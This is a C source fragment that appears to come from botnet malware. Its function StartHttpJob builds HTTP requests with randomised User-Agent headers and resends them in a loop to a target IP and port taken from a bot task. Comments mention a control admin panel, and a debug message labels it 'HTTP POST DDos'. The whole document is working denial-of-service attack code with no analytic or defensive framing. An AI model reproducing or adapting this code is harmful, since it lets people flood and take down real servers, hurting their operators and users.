BOOLEAN StartHttpJob(PBotTask Task)
{
	ULONG Ret = 0;
	ULONG Len = 0;
	PCHAR HttpRequest = 0;
	PBotJobHttp HttpRequestInfo = Task->Job;
	SOCKET hServer = 0;
	struct	sockaddr_in sin_addr = { 0 };

	HttpRequest = ALLOC(512);
	if(!HttpRequest || !HttpRequestInfo)
		goto end;
	/*
		typedef struct _BOT_JOB_HTTP {
			union {
				ULONG HostIp;
				struct in_addr addrTargetIp;
			};
			USHORT Port;
			CHAR Action[5];
			CHAR ActionParam[2048];
			CHAR Host[250];
		}	BotJobHttp, *PBotJobHttp;	
	*/
	rtl_strcat(HttpRequest,(PCHAR)&HttpRequestInfo->Action);
	rtl_strcat(HttpRequest,(PCHAR)&HttpRequestInfo->ActionParam);
	rtl_strcat(HttpRequest,D_HTTP_11);

	HttpRequest[strlen(HttpRequest)] = '\r';
	HttpRequest[strlen(HttpRequest)] = '\n';

	rtl_strcat(HttpRequest,"User-Agent: ");
	rtl_strcat(HttpRequest,RandomUserAgent());
	rtl_strcat(HttpRequest,"\r\n");
	rtl_strcat(HttpRequest,D_HOST);
	rtl_strcat(HttpRequest,(PCHAR)&HttpRequestInfo->Host);

	HttpRequest[strlen(HttpRequest)] = '\r';
	HttpRequest[strlen(HttpRequest)] = '\n';
	HttpRequest[strlen(HttpRequest)] = '\r';
	HttpRequest[strlen(HttpRequest)] = '\n';
	
	sin_addr.sin_addr.S_un.S_addr = HttpRequestInfo->HostIp;
	sin_addr.sin_port = api.phtons(HttpRequestInfo->Port);
	sin_addr.sin_family = AF_INET;

Loop:
	if(hServer)
	{
		api.pshutdown(hServer,-1);
		api.pclosesocket(hServer);
	}

	hServer = api.psocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(hServer == INVALID_SOCKET)
	{
		goto end;
	}

	// Открываем заново
	if(socks_CONNECT(hServer,(SOCKADDR *)&sin_addr, sizeof(sin_addr)) == SOCKET_ERROR)
	{
		Task->JobStatus = JOB_STATUS_PAUSE;
		goto end;
	}

	// если в админке прекратили выполнять задачу
	// Завершаем её
	if( Task->bStop )
	{
		DeleteJob(Task);
		goto end;
	}

	Len = strlen(HttpRequest);
	Ret = socks_SEND(hServer,HttpRequest,Len,0);
	if(	Ret != Len || Ret <= 0) 
	{
		goto end;
	}	else	{
#ifdef _DEBUG_
		DbgPrintEx("HTTP POST DDos : Sended %d bytes\n",Ret);
#endif
		api.pSleep(pGlobOpt->HttpSleepTime);
		goto Loop;
	}

end:
	__try {
		if(HttpRequest)
			FREE(HttpRequest);
		if(hServer)
		{
			api.pshutdown(hServer,-1);
			api.pclosesocket(hServer);
		}
	}	__except(EXCEPTION_EXECUTE_HANDLER){
#ifdef _DEBUG_
		DbgMsgEx(__FILE__,__LINE__,"Error except on free memory!\n");
#endif
	}
	api.pExitThread(-1);
	return TRUE;
}